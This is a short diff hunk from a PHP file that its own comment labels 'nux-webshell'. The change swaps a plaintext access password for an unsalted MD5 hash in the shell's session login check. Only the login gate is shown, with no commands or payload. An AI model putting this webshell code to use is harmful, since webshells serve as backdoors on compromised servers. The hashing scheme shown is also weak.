@@ -9,11 +9,11 @@
 */
 
 session_start();
-$password = "nux@root";
+$password = "b18249f9d5fed54bb749e0ec74223da6"; // md5 hash >> nux-webshell
 
 if (isset($_POST['submit'])) {
-	if ($_POST['password'] == $password) {
-		$_SESSION['password'] = $_POST['password'];
+	if (md5($_POST['password']) == $password) {
+		$_SESSION['password'] = md5($_POST['password']);
 	}
 }
 
